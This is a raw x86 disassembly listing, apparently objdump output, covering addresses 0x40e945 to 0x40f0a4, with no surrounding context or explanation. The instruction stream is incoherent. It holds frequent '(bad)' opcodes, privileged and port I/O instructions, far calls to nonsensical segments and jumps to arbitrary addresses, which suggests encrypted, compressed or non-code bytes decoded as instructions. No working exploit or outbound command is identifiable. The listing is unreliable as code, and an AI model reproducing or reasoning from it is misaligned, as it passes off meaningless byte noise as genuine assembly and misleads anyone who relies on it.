  40e945:	add    DWORD PTR [esi-0x55],0x73
  40e949:	out    0xe8,eax
  40e94b:	push   eax
  40e94c:	dec    ecx
  40e94d:	call   0xc26f5196
  40e952:	adc    eax,DWORD PTR [esp+edi*4-0xb]
  40e956:	jg     0x40e929
  40e958:	call   0xc603:0xf63bf857
  40e95f:	adc    esi,DWORD PTR [edx+eiz*1+0x64]
  40e963:	sub    DWORD PTR [eax],0xffffffd9
  40e966:	sub    ecx,DWORD PTR ds:0xb2f2da0d
  40e96c:	jo     0x40e9c2
  40e96e:	(bad)  
  40e96f:	jo     0x40e9a4
  40e971:	call   0xa40:0xeea436a4
  40e978:	mov    ds:0x72ee18a1,al
  40e97d:	test   DWORD PTR [ebx-0x78],0x5dcc5a6a
  40e984:	cdq    
  40e985:	js     0x40ea01
  40e987:	pushf  
  40e988:	dec    ecx
  40e989:	es rcl cl,cl
  40e98c:	loop   0x40e9a0
  40e98e:	xchg   BYTE PTR [ecx],dh
  40e990:	js     0x40e91d
  40e992:	dec    edi
  40e993:	jmp    0x9fa9b920
  40e998:	stos   BYTE PTR es:[edi],al
  40e999:	repnz fisub WORD PTR [eax+0x700016dc]
  40e9a0:	ror    DWORD PTR [edi],cl
  40e9a2:	(bad)  
  40e9a3:	cs es clc 
  40e9a6:	sbb    edx,DWORD PTR [ebp+0x39a6dba8]
  40e9ac:	mov    bl,0xc5
  40e9ae:	mov    eax,ds:0xcee108a1
  40e9b3:	stos   BYTE PTR es:[edi],al
  40e9b4:	sub    DWORD PTR [edi-0x2887c035],ecx
  40e9ba:	loope  0x40ea34
  40e9bc:	in     eax,0x36
  40e9be:	jb     0x40e9c4
  40e9c0:	xchg   edi,eax
  40e9c1:	mov    edx,0x558b15a0
  40e9c6:	or     al,0x7d
  40e9c8:	and    DWORD PTR [edx+0x4b],ebp
  40e9cb:	(bad)  
  40e9cc:	fadd   st(4),st
  40e9ce:	(bad)  
  40e9cf:	mov    cs,WORD PTR [ebx-0x71]
  40e9d2:	adc    BYTE PTR [ecx+0x7de16540],cl
  40e9d8:	jb     0x40e9cf
  40e9da:	pop    ebp
  40e9db:	in     eax,0x1d
  40e9dd:	xchg   ebp,eax
  40e9de:	rcl    ch,cl
  40e9e0:	repnz retf 0xf415
  40e9e4:	pop    esi
  40e9e5:	add    BYTE PTR [ecx-0x111ab1f0],ch
  40e9eb:	call   0x468f91b6
  40e9f0:	(bad)
  40e9f3:	inc    ebx
  40e9f4:	and    eax,0x210aea6f
  40e9f9:	repz loopne 0x40ea33
  40e9fc:	cs jae 0x40ea65
  40e9ff:	xchg   ecx,eax
  40ea00:	dec    edi
  40ea01:	xor    eax,0x53224d8f
  40ea06:	cmp    DWORD PTR ds:0x948dba7e,0xb
  40ea0d:	sbb    al,BYTE PTR [ecx*2-0x4b72a9f1]
  40ea14:	repnz fs mov ebx,0x8c3d7740
  40ea1b:	inc    ecx
  40ea1c:	and    al,0xd
  40ea1e:	test   DWORD PTR [ebx+0x29dcb2a1],edx
  40ea24:	push   eax
  40ea25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea26:	xchg   edx,eax
  40ea27:	aad    0x98
  40ea29:	mov    ds:0x468fe2a7,al
  40ea2e:	stos   DWORD PTR es:[edi],eax
  40ea2f:	into   
  40ea30:	cmp    BYTE PTR ds:0xc0db13cf,0xb7
  40ea37:	invd   
  40ea39:	pop    ecx
  40ea3a:	mov    bh,0xa6
  40ea3c:	std    
  40ea3d:	jmp    0x51d04167
  40ea42:	sub    DWORD PTR [ecx+ecx*4+0x5c],0xc
  40ea47:	repz cmp BYTE PTR [ebx-0x3],ah
  40ea4b:	pop    ebx
  40ea4c:	or     eax,0x89382ef
  40ea51:	leave  
  40ea52:	fcomp  QWORD PTR [esi]
  40ea54:	ficom  DWORD PTR [ecx]
  40ea56:	ret    0xe0f0
  40ea59:	inc    edi
  40ea5a:	xchg   edx,eax
  40ea5b:	ret    
  40ea5c:	mov    ebx,0x847b25a6
  40ea61:	stos   DWORD PTR es:[edi],eax
  40ea62:	not    edi
  40ea64:	xor    bh,al
  40ea66:	mov    dl,ah
  40ea68:	sbb    eax,0x475146df
  40ea6d:	sub    ecx,DWORD PTR ds:0x662e93b1
  40ea73:	or     BYTE PTR [edx+0x6a12c23],cl
  40ea79:	jmp    0x97e3:0xabece2e7
  40ea80:	sbb    DWORD PTR [esi-0x54],edx
  40ea83:	add    dh,BYTE PTR [eax+ebx*8+0x77]
  40ea87:	xlat   BYTE PTR ds:[ebx]
  40ea88:	test   DWORD PTR [esi+ebx*2+0x5d],0xd98ecd0f
  40ea90:	rol    DWORD PTR [edi-0x4a43e03d],0x4d
  40ea97:	fdivr  QWORD PTR [esi]
  40ea99:	lods   al,BYTE PTR ds:[esi]
  40ea9a:	jge    0x40eb04
  40ea9c:	(bad)  
  40ea9d:	ins    DWORD PTR es:[edi],dx
  40ea9e:	hlt    
  40ea9f:	or     BYTE PTR [edx],ch
  40eaa1:	pushf  
  40eaa2:	sbb    BYTE PTR [eax+edi*1],ch
  40eaa5:	fucomip st,st(1)
  40eaa7:	adc    ah,BYTE PTR [ebp+0x0]
  40eaaa:	imul   edx,DWORD PTR ds:0x20740f0,0x47
  40eab1:	xor    BYTE PTR [edx],dh
  40eab3:	(bad)  
  40eab4:	iret   
  40eab5:	lock scas eax,DWORD PTR es:[edi]
  40eab7:	popa   
  40eab8:	sub    DWORD PTR [ecx+0x150bdf30],ebx
  40eabe:	mov    dl,0xff
  40eac0:	enter  0xacd1,0xaf
  40eac4:	(bad)  
  40eac5:	out    0x32,eax
  40eac7:	add    al,0x2c
  40eac9:	clc    
  40eaca:	sbb    ebp,ecx
  40eacc:	add    al,0x90
  40eace:	sub    al,0xb3
  40ead0:	in     eax,dx
  40ead1:	add    edi,edi
  40ead3:	jle    0x40ea88
  40ead5:	and    esp,DWORD PTR [edx-0x7d5886c7]
  40eadb:	rcr    BYTE PTR [edi+0x55],cl
  40eade:	pop    eax
  40eadf:	bound  esi,QWORD PTR [edx+0x3d]
  40eae2:	mov    ecx,0xe13db84c
  40eae7:	jae    0x40eb25
  40eae9:	pop    es
  40eaea:	mov    eax,0xe6492d92
  40eaef:	xor    DWORD PTR [ebx-0x5d78cbf],esp
  40eaf5:	retf   0xdbc8
  40eaf8:	iret   
  40eaf9:	pop    ebp
  40eafa:	mov    cl,0xc0
  40eafc:	sbb    BYTE PTR [ecx],ch
  40eafe:	cld    
  40eaff:	push   ss
  40eb00:	in     eax,dx
  40eb01:	fisubr WORD PTR [edi]
  40eb03:	xor    eax,0x20e4a1f0
  40eb08:	mov    ds:0x9d2448f7,eax
  40eb0d:	and    edi,esp
  40eb0f:	lods   eax,DWORD PTR ds:[esi]
  40eb10:	cmp    DWORD PTR [ebp+0x2b],edi
  40eb13:	and    esi,0xffffff94
  40eb16:	bound  esi,QWORD PTR [edx-0x5ae96dc3]
  40eb1c:	(bad)  
  40eb1d:	lock pop edi
  40eb1f:	jmp    0x40eb75
  40eb21:	inc    edx
  40eb22:	mov    ebx,0x387f33bd
  40eb27:	xchg   esi,eax
  40eb28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb29:	push   es
  40eb2a:	adc    edi,edx
  40eb2c:	and    dh,ch
  40eb2e:	in     eax,dx
  40eb2f:	push   eax
  40eb30:	sbb    BYTE PTR [eax+0x46],bl
  40eb33:	cli    
  40eb34:	pop    edi
  40eb35:	push   ebx
  40eb36:	clc    
  40eb37:	mov    bl,BYTE PTR cs:[ecx+0x32]
  40eb3b:	rol    dl,0xcb
  40eb3e:	fidivr WORD PTR [ecx-0x3ad63a30]
  40eb44:	xor    esi,DWORD PTR [edi+0x10]
  40eb47:	xor    eax,0xa86a1ea5
  40eb4c:	push   cs
  40eb4d:	mov    eax,0x36fb6e11
  40eb52:	mov    ch,0x4b
  40eb54:	lahf   
  40eb55:	shl    BYTE PTR [esi],cl
  40eb57:	fwait
  40eb58:	stos   BYTE PTR es:[edi],al
  40eb59:	xchg   edi,eax
  40eb5a:	add    DWORD PTR [edx+eax*4],0xd209d1b6
  40eb61:	shl    dh,1
  40eb63:	mov    ds:0xc32fd938,eax
  40eb68:	jp     0x40eb1f
  40eb6a:	dec    ebx
  40eb6b:	call   0x176e:0x77b5ca8f
  40eb72:	stc    
  40eb73:	xor    ecx,ebx
  40eb75:	scas   eax,DWORD PTR es:[edi]
  40eb76:	js     0x40eb81
  40eb78:	into   
  40eb79:	jns    0x40ebb3
  40eb7b:	ds (bad) 
  40eb7d:	aas    
  40eb7e:	mov    dh,0x7a
  40eb80:	xchg   esi,eax
  40eb81:	inc    ebx
  40eb82:	push   ds
  40eb83:	xchg   edi,eax
  40eb84:	pop    edi
  40eb85:	push   eax
  40eb86:	pop    edx
  40eb87:	xor    DWORD PTR [ebp+0x42],ebx
  40eb8a:	mov    edi,0x7b84bf1a
  40eb8f:	hlt    
  40eb90:	push   ds
  40eb91:	jno    0x40eb2c
  40eb93:	fxch   st(2)
  40eb95:	pop    ebx
  40eb96:	pop    edi
  40eb97:	cmp    BYTE PTR [edi+0x2f],0xad
  40eb9b:	jnp    0x40ebac
  40eb9d:	or     ah,BYTE PTR [ebp+0x22]
  40eba0:	in     eax,dx
  40eba1:	in     al,dx
  40eba2:	call   0x378bdfcf
  40eba7:	daa    
  40eba8:	pop    esi
  40eba9:	loopne 0x40ebf9
  40ebab:	inc    eax
  40ebac:	push   edi
  40ebad:	and    DWORD PTR [edx+0x3e],esp
  40ebb0:	xor    BYTE PTR ds:0x83507eca,0x4a
  40ebb7:	inc    edi
  40ebb8:	jb     0x40eb3b
  40ebba:	cs loope 0x40eb8f
  40ebbd:	sub    eax,edi
  40ebbf:	sub    bl,bh
  40ebc1:	pushf  
  40ebc2:	and    al,BYTE PTR [ebp+0xc3fb458]
  40ebc8:	push   esi
  40ebc9:	pop    ecx
  40ebca:	mov    esi,0xa641b1ea
  40ebcf:	rcl    BYTE PTR [esi],1
  40ebd1:	fdivr  st,st(3)
  40ebd3:	jp     0x40ec49
  40ebd5:	mov    esp,0x2eabe645
  40ebda:	inc    esi
  40ebdb:	out    0x76,al
  40ebdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebde:	(bad)  
  40ebdf:	dec    esi
  40ebe0:	dec    ebx
  40ebe1:	mov    edi,0xef3ad149
  40ebe6:	sar    DWORD PTR [esi],cl
  40ebe8:	in     al,0x64
  40ebea:	sbb    edi,edi
  40ebec:	bound  ebp,QWORD PTR [edx]
  40ebee:	mov    ah,0xca
  40ebf0:	jecxz  0x40ec32
  40ebf2:	shr    DWORD PTR [eax+0x1c],0x1d
  40ebf6:	push   ebx
  40ebf7:	daa    
  40ebf8:	mov    edi,0x85066f69
  40ebfd:	loop   0x40ebc1
  40ebff:	aam    0x5
  40ec01:	push   ds
  40ec02:	add    DWORD PTR [esi+0x2cc48ed7],eax
  40ec08:	cmp    edi,DWORD PTR [edi]
  40ec0a:	pusha  
  40ec0b:	sbb    dh,cl
  40ec0d:	icebp  
  40ec0e:	cdq    
  40ec0f:	cdq    
  40ec10:	(bad)  
  40ec11:	cmp    al,0x54
  40ec13:	dec    ecx
  40ec14:	cwde   
  40ec15:	push   ebx
  40ec16:	inc    esi
  40ec17:	add    DWORD PTR [edi+0x1a],ebp
  40ec1a:	inc    ebp
  40ec1b:	addr16 mov ds:0x53d0,eax
  40ec1f:	mov    dl,0x2f
  40ec21:	in     al,0xa3
  40ec23:	inc    eax
  40ec24:	push   esi
  40ec25:	ds pop eax
  40ec27:	mov    esp,0x97e6c24d
  40ec2d:	push   edi
  40ec2e:	dec    edi
  40ec2f:	mov    ds:0x3e21f2ac,al
  40ec34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec35:	xor    eax,0x5ab00d12
  40ec3a:	lahf   
  40ec3b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec3d:	loopne 0x40ebc0
  40ec3f:	push   0xb27e118b
  40ec44:	push   es
  40ec45:	push   cs
  40ec46:	xor    eax,0x6ad70933
  40ec4b:	pop    edi
  40ec4c:	push   ss
  40ec4d:	fstp   TBYTE PTR ds:0x56aea9c9
  40ec53:	or     al,0x76
  40ec55:	mov    dh,dh
  40ec57:	sbb    bl,BYTE PTR [ebp+0x3312683c]
  40ec5d:	mov    edx,0x92ffa764
  40ec62:	test   ebx,esi
  40ec64:	xor    esi,DWORD PTR [ebp-0x1c]
  40ec67:	push   cs
  40ec68:	(bad)  
  40ec69:	jge    0x40ec81
  40ec6b:	pop    esp
  40ec6c:	mov    ebp,0x5a780704
  40ec71:	(bad)  
  40ec73:	push   edx
  40ec74:	and    al,0x38
  40ec76:	sbb    DWORD PTR [eax+ebp*2-0x6e],ebp
  40ec7a:	sub    esi,DWORD PTR [ebx+ebp*1+0x3c3647ea]
  40ec81:	data16 jae 0x40ecf3
  40ec84:	adc    ah,BYTE PTR [eax+0x7e]
  40ec87:	mov    ds:0x779258ca,eax
  40ec8c:	call   0xb63d:0x4c26ac96
  40ec93:	in     al,dx
  40ec94:	adc    BYTE PTR [edx-0x10],bl
  40ec97:	lods   eax,DWORD PTR ds:[esi]
  40ec98:	(bad)  
  40ec99:	mov    al,0x10
  40ec9b:	mov    esi,0x61b52b3d
  40eca0:	dec    ebp
  40eca1:	inc    ebx
  40eca2:	retf   0x4693
  40eca5:	mov    edx,0xe5765546
  40ecaa:	les    ecx,FWORD PTR [eax-0x43]
  40ecad:	(bad)  
  40ecae:	sbb    esi,DWORD PTR [ecx]
  40ecb0:	sbb    BYTE PTR [ebp+0x53],ah
  40ecb3:	sbb    eax,0xa9b5cc8c
  40ecb8:	pop    esi
  40ecb9:	std    
  40ecba:	sub    DWORD PTR [ecx-0x6],0x5a516b70
  40ecc1:	pop    ds
  40ecc2:	lods   al,BYTE PTR ds:[esi]
  40ecc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecc4:	arpl   WORD PTR [esi-0x20],sp
  40ecc7:	das    
  40ecc8:	in     al,0x84
  40ecca:	xchg   esp,eax
  40eccb:	push   ecx
  40eccc:	sahf   
  40eccd:	imul   eax,DWORD PTR [eax-0x6e91e568],0xd703f82b
  40ecd7:	hlt    
  40ecd8:	retf   0x57ae
  40ecdb:	add    eax,0xe4759cc7
  40ece0:	dec    ecx
  40ece1:	pop    ss
  40ece2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ece3:	aaa    
  40ece4:	push   ds
  40ece5:	cmp    eax,0x19048275
  40ecea:	pop    es
  40eceb:	pop    ebx
  40ecec:	mov    ds:0x523b2985,al
  40ecf1:	data16 xor BYTE PTR [edi+ebx*4-0x7e],ah
  40ecf6:	adc    eax,0x39179a39
  40ecfb:	jg     0x40eccb
  40ecfd:	cmp    BYTE PTR [ebx-0x28],bh
  40ed00:	(bad)  
  40ed01:	and    edx,edx
  40ed03:	test   al,0x46
  40ed05:	mov    dl,0x9b
  40ed07:	pop    esi
  40ed08:	ret    
  40ed09:	call   0x63b2:0x6af30590
  40ed10:	mov    esp,0x111509d6
  40ed15:	jmp    0x40ecf3
  40ed17:	or     al,0x6
  40ed19:	loopne 0x40ecfc
  40ed1b:	imul   esp,DWORD PTR [ebx+0x9],0xffffffde
  40ed1f:	dec    esi
  40ed20:	dec    DWORD PTR [edx]
  40ed22:	inc    edx
  40ed23:	test   BYTE PTR [edx+0x4],0x43
  40ed27:	xor    al,0x48
  40ed29:	or     DWORD PTR [ecx],ebp
  40ed2b:	sub    edi,ebp
  40ed2d:	fdiv   DWORD PTR [eax-0x7bab22e7]
  40ed33:	out    0x8,eax
  40ed35:	retf   0x3e4c
  40ed38:	jp     0x40ed12
  40ed3a:	push   cs
  40ed3b:	in     al,dx
  40ed3c:	and    ebp,DWORD PTR [edi-0x76]
  40ed3f:	das    
  40ed40:	mov    ds:0xbb1cf016,al
  40ed45:	outs   dx,BYTE PTR gs:[esi]
  40ed47:	inc    esp
  40ed48:	push   esp
  40ed49:	ss ds inc ebp
  40ed4c:	pop    eax
  40ed4d:	jb     0x40ed76
  40ed4f:	mov    bh,0xef
  40ed51:	adc    BYTE PTR [ebp-0x40],0xde
  40ed55:	xor    eax,0xce7d0157
  40ed5a:	mov    ebx,0x9bd0e561
  40ed5f:	test   eax,0x514b3cba
  40ed64:	stc    
  40ed65:	icebp  
  40ed66:	mov    ch,0x98
  40ed68:	jg     0x40ed90
  40ed6a:	in     eax,0x32
  40ed6c:	div    DWORD PTR [esi+0x4b]
  40ed6f:	cwde   
  40ed70:	pop    ds
  40ed71:	pusha  
  40ed72:	arpl   WORD PTR [esi-0x6e3d41d],cx
  40ed78:	cmc    
  40ed79:	call   0x2ffe:0x7f11358
  40ed80:	jmp    0x40edfc
  40ed82:	push   ss
  40ed83:	dec    edi
  40ed84:	ret    
  40ed85:	xor    bl,cl
  40ed87:	shr    BYTE PTR [ebx-0x27b393ae],0xa4
  40ed8e:	call   0x289b23e8
  40ed93:	dec    esp
  40ed94:	mov    esp,0xa57bc117
  40ed99:	xor    al,0xb6
  40ed9b:	jecxz  0x40ed88
  40ed9d:	dec    edx
  40ed9e:	mov    ch,0x4e
  40eda0:	in     al,dx
  40eda1:	adc    al,0xb
  40eda3:	mov    ds:0xbb8e783f,al
  40eda8:	popa   
  40eda9:	jp     0x40ed44
  40edab:	sar    BYTE PTR [ecx+0x443a2195],0x7a
  40edb2:	adc    ch,BYTE PTR [ecx-0x317a9010]
  40edb8:	aas    
  40edb9:	adc    al,dl
  40edbb:	jno    0x40ed66
  40edbd:	call   0x220f:0x1f73328e
  40edc4:	daa    
  40edc5:	ficom  WORD PTR [esi]
  40edc7:	mov    ah,0x47
  40edc9:	adc    ah,dl
  40edcb:	pop    ebp
  40edcc:	bound  edi,QWORD PTR [eax-0x60]
  40edcf:	mov    eax,0xe520efff
  40edd4:	stos   BYTE PTR es:[edi],al
  40edd5:	add    cl,BYTE PTR [esi-0x399697fe]
  40eddb:	ret    
  40eddc:	in     al,0x6a
  40edde:	les    ecx,FWORD PTR [edx+eiz*2-0x32978565]
  40ede5:	dec    edi
  40ede6:	push   edi
  40ede7:	dec    ebx
  40ede8:	(bad)  
  40ede9:	in     eax,dx
  40edea:	cli    
  40edeb:	mov    es,WORD PTR ds:0x672262f4
  40edf1:	int    0xc0
  40edf3:	clc    
  40edf4:	aaa    
  40edf5:	jecxz  0x40ee31
  40edf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf8:	mov    esi,DWORD PTR [esi]
  40edfa:	xor    edi,DWORD PTR [edi+esi*8]
  40edfd:	sub    BYTE PTR [ebx+0x2e6df2c],bl
  40ee03:	(bad)  
  40ee04:	mov    esp,0x89d64140
  40ee09:	daa    
  40ee0a:	push   ecx
  40ee0b:	retf   
  40ee0c:	xlat   BYTE PTR ds:[ebx]
  40ee0d:	add    dh,BYTE PTR [ebx+0x7c]
  40ee10:	loopne 0x40ed9f
  40ee12:	call   0x3f27e32a
  40ee17:	mov    DWORD PTR ds:0x117f6093,esp
  40ee1d:	xor    esp,DWORD PTR [ebp+0xb6c25c6]
  40ee23:	add    eax,0xfea1d9dd
  40ee28:	add    esp,DWORD PTR [ebp+0x59edd0b7]
  40ee2e:	rcl    BYTE PTR [eax-0xe],0xfe
  40ee32:	add    esp,DWORD PTR ds:[edx+0x45]
  40ee36:	data16 adc al,al
  40ee39:	dec    eax
  40ee3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee3b:	iret   
  40ee3c:	loop   0x40edca
  40ee3e:	xchg   ecx,eax
  40ee3f:	lahf   
  40ee40:	daa    
  40ee41:	lea    esi,[esi+0x1654f45c]
  40ee47:	inc    ecx
  40ee48:	and    DWORD PTR [ecx+0xf14894d],ebp
  40ee4e:	inc    edi
  40ee4f:	jne    0x40ee61
  40ee51:	jnp    0x40edeb
  40ee53:	ins    DWORD PTR es:[edi],dx
  40ee54:	in     al,dx
  40ee55:	xor    BYTE PTR [ebx],al
  40ee57:	inc    ecx
  40ee58:	dec    esi
  40ee59:	out    dx,eax
  40ee5a:	call   0x3341517b
  40ee5f:	or     ebx,DWORD PTR [ecx+edi*8]
  40ee62:	push   es
  40ee63:	lahf   
  40ee64:	scas   eax,DWORD PTR es:[edi]
  40ee65:	or     eax,0xfce4717a
  40ee6a:	(bad)  
  40ee6b:	cmc    
  40ee6c:	cdq    
  40ee6d:	(bad)  
  40ee6e:	icebp  
  40ee6f:	mov    dh,0xa7
  40ee71:	push   ecx
  40ee72:	bound  ebx,QWORD PTR [edi-0x32]
  40ee75:	out    0xce,al
  40ee77:	pop    ebx
  40ee78:	fcmovne st,st(3)
  40ee7a:	sub    ecx,DWORD PTR [edi+0x9]
  40ee7d:	retf   0xaccf
  40ee80:	sub    DWORD PTR [eax-0x17],esp
  40ee83:	cmovg  esi,DWORD PTR [eax]
  40ee86:	test   DWORD PTR [esi-0x4b],eax
  40ee89:	shl    BYTE PTR [ecx+0x401ce92b],1
  40ee8f:	mov    al,0x4
  40ee91:	sbb    BYTE PTR gs:0xa895ae3e,0xeb
  40ee99:	sar    DWORD PTR [esi+0x444ca598],cl
  40ee9f:	jmp    0xe1a3d2
  40eea4:	test   al,0x93
  40eea6:	aaa    
  40eea7:	jge    0x40ee7b
  40eea9:	(bad)  
  40eeaa:	cwde   
  40eeab:	daa    
  40eeac:	dec    esp
  40eead:	xchg   DWORD PTR [edi],eax
  40eeaf:	icebp  
  40eeb0:	push   esp
  40eeb1:	pop    esp
  40eeb2:	jo     0x40eeb2
  40eeb4:	pop    edi
  40eeb5:	(bad)  [edi+ebx*8]
  40eeb8:	pop    esi
  40eeb9:	adc    dh,bl
  40eebb:	test   al,0xae
  40eebd:	ss into 
  40eebf:	in     al,0xab
  40eec1:	sub    al,0xda
  40eec4:	icebp  
  40eec5:	mov    WORD PTR [ebx],ss
  40eec7:	ins    DWORD PTR es:[edi],dx
  40eec8:	shl    ah,1
  40eeca:	jns    0x40eec8
  40eecc:	(bad)  
  40eecd:	out    dx,eax
  40eece:	adc    esp,DWORD PTR [ecx-0x3a41a37c]
  40eed4:	pop    ebx
  40eed5:	or     esp,DWORD PTR [ebp-0x5bae4659]
  40eedb:	scas   eax,DWORD PTR es:[edi]
  40eedc:	aad    0xb9
  40eede:	call   0xe73a:0x6f4c697
  40eee5:	cmp    esi,esp
  40eee7:	(bad)  
  40eee8:	call   0xe1d02fbd
  40eeed:	mov    cl,0xa6
  40eeef:	or     al,0xfa
  40eef1:	mov    gs,WORD PTR [edi-0x572cdc4c]
  40eef7:	addr16 nop
  40eef9:	push   esp
  40eefa:	dec    eax
  40eefb:	(bad)  
  40eefc:	call   0x4f8fe534
  40ef01:	repz push cs
  40ef03:	test   BYTE PTR [edx+eax*2+0x1745c08f],ah
  40ef0a:	cmp    BYTE PTR [eax],0xa5
  40ef0d:	adc    eax,0xa6e2d477
  40ef12:	outs   dx,BYTE PTR ds:[esi]
  40ef13:	mov    ebx,0x5d168ae4
  40ef18:	(bad)  
  40ef1b:	ins    BYTE PTR es:[edi],dx
  40ef1c:	push   edi
  40ef1d:	xlat   BYTE PTR ds:[ebx]
  40ef1e:	mov    ah,0x8b
  40ef20:	dec    edi
  40ef21:	add    eax,0xbb3e1d07
  40ef26:	(bad)  
  40ef27:	pop    edi
  40ef28:	mov    ecx,0xc4c2731c
  40ef2d:	push   0xfffffffe
  40ef2f:	(bad)  
  40ef30:	stc    
  40ef31:	dec    esp
  40ef32:	out    0xd5,al
  40ef34:	cli    
  40ef35:	test   DWORD PTR [edi-0x51],ecx
  40ef38:	push   ebp
  40ef39:	xchg   esi,eax
  40ef3a:	out    0xa1,eax
  40ef3c:	rcl    ebx,cl
  40ef3e:	pop    edx
  40ef3f:	lods   eax,DWORD PTR ds:[esi]
  40ef40:	ret    
  40ef41:	adc    al,0x84
  40ef43:	fs loop 0x40ef5c
  40ef46:	push   ss
  40ef47:	fmul   st,st(4)
  40ef49:	outs   dx,DWORD PTR ds:[esi]
  40ef4a:	(bad)  
  40ef4b:	xchg   ebp,eax
  40ef4c:	dec    edi
  40ef4d:	repz ja 0x40ef55
  40ef50:	push   ebp
  40ef51:	fwait
  40ef52:	call   FWORD PTR [ebp+0xf]
  40ef55:	push   ds
  40ef56:	or     ch,BYTE PTR [esi+0x6008e6d5]
  40ef5c:	push   ss
  40ef5d:	xchg   BYTE PTR [edi-0x7],ah
  40ef60:	and    DWORD PTR [ecx-0x3d],eax
  40ef63:	dec    ebp
  40ef64:	inc    esi
  40ef65:	sub    al,BYTE PTR [esi+0x17b17169]
  40ef6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef6c:	outs   dx,DWORD PTR ds:[esi]
  40ef6d:	call   0xf309:0xe0799178
  40ef74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef75:	ss and al,0x64
  40ef78:	push   ecx
  40ef79:	jg     0x40ef55
  40ef7b:	mov    ecx,0xca16c43e
  40ef80:	les    eax,FWORD PTR [ebp-0x6c]
  40ef83:	or     eax,0x2f4e1a50
  40ef88:	mov    esi,0x3b55f87e
  40ef8d:	loope  0x40efd1
  40ef8f:	je     0x40efcd
  40ef91:	ret    0xae1a
  40ef94:	pop    es
  40ef95:	cmc    
  40ef96:	inc    esi
  40ef97:	mov    eax,DWORD PTR [edx-0x16d0a9b2]
  40ef9d:	xor    ah,BYTE PTR [edi]
  40ef9f:	ret    
  40efa0:	fiadd  WORD PTR [esp+edx*1+0x4d24a86f]
  40efa7:	mov    bl,0x69
  40efa9:	iret   
  40efaa:	jg     0x40ef65
  40efac:	and    eax,0xf00a31a3
  40efb1:	icebp  
  40efb2:	je     0x40efb7
  40efb4:	pop    es
  40efb5:	test   al,0xf6
  40efb7:	(bad)  
  40efb8:	xchg   ebp,eax
  40efb9:	and    DWORD PTR [esi+0x26235a72],0x8b5ca38b
  40efc3:	mov    cl,0xf7
  40efc5:	aad    0xcd
  40efc7:	popf   
  40efc8:	jae    0x40efe2
  40efca:	sub    DWORD PTR [edx+0x3b8ec36a],0xfffffff2
  40efd1:	lock arpl bp,sp
  40efd4:	lahf   
  40efd5:	jnp    0x40efec
  40efd7:	inc    edx
  40efd8:	xchg   DWORD PTR [edx],esi
  40efda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efdb:	pop    eax
  40efdc:	push   ebp
  40efdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efde:	mov    ds:0xfb8a1fa5,al
  40efe3:	pop    edi
  40efe4:	and    bl,bh
  40efe6:	aaa    
  40efe7:	dec    edx
  40efe8:	push   edx
  40efe9:	je     0x40efa0
  40efeb:	ins    BYTE PTR es:[edi],dx
  40efec:	inc    edx
  40efed:	lahf   
  40efee:	dec    eax
  40efef:	cmc    
  40eff0:	cwde   
  40eff1:	dec    eax
  40eff2:	add    al,0xb6
  40eff4:	sbb    BYTE PTR [ebx+0x72],0xa2
  40eff8:	mov    DWORD PTR [edx-0x3e6f6c5f],edx
  40effe:	jmp    0x40ef9b
  40f000:	daa    
  40f001:	mov    ebx,0x94f2b872
  40f006:	and    edx,esp
  40f008:	ret    0xb10a
  40f00b:	push   es
  40f00c:	xchg   BYTE PTR [esp+ebp*2+0x64],ch
  40f010:	jnp    0x40eff5
  40f012:	inc    eax
  40f013:	loopne 0x40efd8
  40f015:	mov    ebp,0xd8befe0a
  40f01a:	fdiv   st(5),st
  40f01c:	pop    ecx
  40f01d:	sub    eax,0x113ae927
  40f022:	and    BYTE PTR [edx],bl
  40f024:	cmp    cl,BYTE PTR [eax]
  40f026:	test   al,0xc4
  40f028:	leave  
  40f029:	jl     0x40f091
  40f02b:	aas    
  40f02c:	pop    ss
  40f02d:	xchg   edx,eax
  40f02e:	bound  eax,QWORD PTR [esi]
  40f030:	mov    cl,0x5d
  40f032:	xlat   BYTE PTR ds:[ebx]
  40f033:	out    dx,al
  40f034:	sbb    al,dh
  40f036:	dec    esi
  40f037:	pop    ds
  40f038:	mov    dh,0x19
  40f03a:	dec    ecx
  40f03b:	lahf   
  40f03c:	mov    esp,0x8f0d9102
  40f041:	jecxz  0x40f053
  40f043:	call   0x442c0235
  40f048:	pop    edx
  40f049:	inc    esi
  40f04a:	lahf   
  40f04b:	mov    ah,0x48
  40f04d:	and    DWORD PTR [eax],ecx
  40f04f:	clc    
  40f050:	inc    ecx
  40f051:	xor    BYTE PTR [eax+0x1f7bebb],dh
  40f057:	jmp    0x40f055
  40f059:	jg     0x40f056
  40f05b:	pop    esi
  40f05c:	div    esp
  40f05e:	cmp    bh,BYTE PTR [ebp-0x79]
  40f061:	push   0x4d
  40f063:	test   BYTE PTR [ebx+eiz*1],0xc4
  40f067:	(bad)  
  40f068:	sbb    ebp,DWORD PTR [esi+edi*4]
  40f06b:	ret    
  40f06c:	inc    edi
  40f06d:	mov    ds:0xc08b0e49,eax
  40f072:	dec    ebp
  40f073:	xlat   BYTE PTR ds:[ebx]
  40f074:	cmp    eax,esp
  40f076:	cld    
  40f077:	imul   esp,DWORD PTR [edx+ebx*1],0xb6d173b0
  40f07e:	fisttp DWORD PTR [ecx+eax*2-0x58]
  40f082:	inc    ebp
  40f083:	xor    ah,0x4e
  40f086:	stos   BYTE PTR es:[edi],al
  40f087:	pushf  
  40f088:	(bad)  
  40f089:	repz dec ecx
  40f08b:	jecxz  0x40f061
  40f08d:	fst    QWORD PTR [edx]
  40f08f:	mov    edi,0x3f0cd65f
  40f094:	or     BYTE PTR [eax-0x43899fa3],dh
  40f09a:	mov    esi,0x3b59ecea
  40f09f:	pop    esp
  40f0a0:	je     0x40f0da
  40f0a2:	or     bh,al
  40f0a4:	cs popf 
